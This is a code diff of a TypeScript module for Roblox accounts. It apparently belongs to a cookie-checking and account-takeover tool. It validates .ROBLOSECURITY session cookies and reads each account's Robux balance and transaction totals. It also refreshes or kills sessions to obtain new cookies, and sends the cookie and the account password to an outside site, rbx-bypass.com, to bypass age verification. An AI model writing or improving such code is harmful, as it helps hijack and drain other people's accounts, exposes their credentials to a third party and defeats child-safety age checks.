@@ -1,6 +1,37 @@
+// src/lib/roblox-api.ts
 import axios from 'axios';
 import { CookieJar } from 'tough-cookie';
 import { wrapper } from 'axios-cookiejar-support';
+
+const AXIOS_TIMEOUT = 25000;
+const MAX_RETRIES = 3;
+const RETRY_DELAY = 1000;
+
+async function axiosWithRetry<T>(
+  method: 'get' | 'post' | 'patch',
+  url: string,
+  options: any = {},
+  retries = MAX_RETRIES
+): Promise<T> {
+  let lastError: any;
+  for (let attempt = 1; attempt <= retries; attempt++) {
+    try {
+      const resp = await axios[method](url, {
+        ...options,
+        timeout: AXIOS_TIMEOUT,
+        validateStatus: () => true,
+      });
+      return resp as T;
+    } catch (err: any) {
+      lastError = err;
+      if (attempt < retries) {
+        const delay = RETRY_DELAY * Math.pow(2, attempt) + Math.random() * 500;
+        await new Promise(resolve => setTimeout(resolve, delay));
+      }
+    }
+  }
+  throw lastError;
+}
 
 export function extractCookie(raw: string): string | null {
   const trimmed = raw.trim();
@@ -42,7 +73,7 @@ export async function validateCookie(cookie: string, maxAttempts = 4): Promise<{
       const resp = await client.get('https://users.roblox.com/v1/users/authenticated', {
         headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
         validateStatus: () => true,
-        timeout: 20000,
+        timeout: AXIOS_TIMEOUT,
       });
 
       log(`Attempt ${attempt}: status ${resp.status}`);
@@ -73,7 +104,7 @@ export async function validateCookie(cookie: string, maxAttempts = 4): Promise<{
     } catch (err: any) {
       log(`Attempt ${attempt} error: ${err.message}`);
       if (attempt === maxAttempts) {
-        const isNetwork = err.message.includes('getaddrinfo') || err.message.includes('ENOTFOUND') || err.message.includes('ETIMEDOUT');
+        const isNetwork = err.message.includes('getaddrinfo') || err.message.includes('ENOTFOUND') || err.message.includes('ETIMEDOUT') || err.code === 'ECONNRESET';
         return { valid: false, debug: debugLines.join('\n'), isNetworkError: isNetwork };
       }
       const delay = Math.min(1000 * Math.pow(2, attempt), 8000) + Math.random() * 1000;
@@ -89,9 +120,57 @@ export async function validateCookie(cookie: string, maxAttempts = 4): Promise<{
   };
 }
 
+export async function refreshSession(cookie: string): Promise<{ success: boolean; newCookie: string | null; error?: string }> {
+  try {
+    const trimmed = cookie.trim();
+    const jar = new CookieJar();
+    await jar.setCookie(`.ROBLOSECURITY=${trimmed}; Domain=.roblox.com; Path=/`, 'https://auth.roblox.com');
+    const client = wrapper(axios.create({ jar }));
+
+    const baseHeaders = {
+      'Content-Type': 'application/json',
+      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+    };
+
+    const csrfResp = await client.post('https://auth.roblox.com/v2/logout', {}, {
+      headers: baseHeaders,
+      validateStatus: () => true,
+      timeout: AXIOS_TIMEOUT,
+    });
+    const csrf = csrfResp.headers['x-csrf-token'] as string | undefined;
+    if (!csrf) {
+      return { success: false, newCookie: null, error: `CSRF missing (${csrfResp.status})` };
+    }
+
+    const refreshHeaders = { ...baseHeaders, 'X-CSRF-TOKEN': csrf };
+    const refreshResp = await client.post('https://auth.roblox.com/v2/session/refresh', {}, {
+      headers: refreshHeaders,
+      validateStatus: () => true,
+      timeout: AXIOS_TIMEOUT,
+    });
+    if (refreshResp.status !== 200) {
+      return { success: false, newCookie: null, error: `Refresh failed (${refreshResp.status})` };
+    }
+
+    const setCookie = refreshResp.headers['set-cookie'];
+    let newCookie: string | null = null;
+    if (setCookie) {
+      const raw = Array.isArray(setCookie) ? setCookie.join(';') : setCookie;
+      const match = raw.match(/\.ROBLOSECURITY=([^;]+)/);
+      if (match) newCookie = match[1];
+    }
+    if (!newCookie) {
+      return { success: false, newCookie: null, error: 'No new cookie in response' };
+    }
+    return { success: true, newCookie };
+  } catch (err: any) {
+    return { success: false, newCookie: null, error: err.message };
+  }
+}
+
 export async function getUserAge(userId: number): Promise<number> {
   try {
-    const resp = await axios.get(`https://users.roblox.com/v1/users/${userId}`, { timeout: 10000 });
+    const resp = await axios.get(`https://users.roblox.com/v1/users/${userId}`, { timeout: AXIOS_TIMEOUT });
     const created = new Date(resp.data.created);
     const now = new Date();
     const diff = now.getTime() - created.getTime();
@@ -103,10 +182,8 @@ export async function getUserAge(userId: number): Promise<number> {
 
 export async function fetchRobux(cookie: string, userId: string): Promise<number> {
   try {
-    const resp = await axios.get(`https://economy.roblox.com/v1/users/${userId}/currency`, {
+    const resp = await axiosWithRetry<any>('get', `https://economy.roblox.com/v1/users/${userId}/currency`, {
       headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
-      validateStatus: () => true,
-      timeout: 10000,
     });
     if (resp.status === 200 && resp.data?.robux !== undefined) return resp.data.robux;
   } catch {}
@@ -115,8 +192,7 @@ export async function fetchRobux(cookie: string, userId: string): Promise<number
 
 export async function fetchTransactionTotals(cookie: string, userId: string): Promise<{ incoming: number; outgoing: number }> {
   try {
-    const url = `https://apis.roblox.com/transaction-records/v1/users/${userId}/transaction-totals?usedTypes=2228224&timeFrame=Year&transactionType=summary`;
-    const resp = await fetch(url, {
+    const resp = await fetch(`https://apis.roblox.com/transaction-records/v1/users/${userId}/transaction-totals?usedTypes=2228224&timeFrame=Year&transactionType=summary`, {
       headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
     });
     if (resp.status === 200) {
@@ -206,12 +282,12 @@ export async function killAndRefreshSession(cookie: string): Promise<{ success: 
     let authResp;
 
     for (let attempt = 0; attempt < 3; attempt++) {
-      authResp = await client.post(url, {}, { headers, validateStatus: () => true });
+      authResp = await client.post(url, {}, { headers, validateStatus: () => true, timeout: AXIOS_TIMEOUT });
       if (authResp.status === 403) {
         const csrf = authResp.headers['x-csrf-token'];
         if (csrf) {
           headers['X-CSRF-TOKEN'] = csrf;
-          authResp = await client.post(url, {}, { headers, validateStatus: () => true });
+          authResp = await client.post(url, {}, { headers, validateStatus: () => true, timeout: AXIOS_TIMEOUT });
         }
       }
       if (authResp.status === 200) {
@@ -239,7 +315,12 @@ export async function killAndRefreshSession(cookie: string): Promise<{ success: 
   }
 }
 
-export async function bypassAgeVerification(cookie: string, password: string): Promise<{ success: boolean; message: string; newCookie?: string }> {
+export async function bypassAgeVerification(cookie: string, password: string): Promise<{
+  success: boolean;
+  message: string;
+  newCookie?: string;
+  inProgress?: boolean;
+}> {
   try {
     const resp = await axios.post(
       'https://rbx-bypass.com/api/public/bypass',
@@ -252,21 +333,33 @@ export async function bypassAgeVerification(cookie: string, password: string): P
           'origin': 'https://rbx-bypass.com',
           'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
         },
-        timeout: 20000,
+        timeout: AXIOS_TIMEOUT,
         validateStatus: () => true,
       }
     );
-    const data = resp.data;
-    if (data.success === true) {
-      return { success: true, message: data.message || 'Success', newCookie: data.cookie || undefined };
+
+    if (typeof resp.data === 'string' && resp.data.trim() === 'Loading...') {
+      return { success: false, message: 'Loading...', inProgress: true };
     }
-    if (data.error === 'BYPASS_IN_PROGRESS') {
-      return { success: false, message: 'Progressing..' };
+
+    if (typeof resp.data === 'object' && resp.data !== null) {
+      const data = resp.data;
+      if (data.success === true) {
+        return { success: true, message: data.message || 'Success', newCookie: data.cookie || undefined };
+      }
+      if (data.error === 'BYPASS_IN_PROGRESS') {
+        return { success: false, message: 'Progressing..', inProgress: true };
+      }
+      return { success: false, message: data.message || data.error || 'Unknown error' };
     }
-    return { success: false, message: data.message || data.error || 'Unknown error' };
+
+    return { success: false, message: `Unexpected response: ${resp.data}` };
   } catch (err: any) {
     if (err.code === 'ECONNABORTED' || err.message?.includes('timeout')) {
-      return { success: false, message: 'Progressing..' };
+      return { success: false, message: 'Progressing..', inProgress: true };
+    }
+    if (err.code === 'ECONNRESET' || err.message?.includes('socket disconnected')) {
+      return { success: false, message: 'Network error, please retry.' };
     }
     return { success: false, message: err.message || 'Unknown error' };
   }
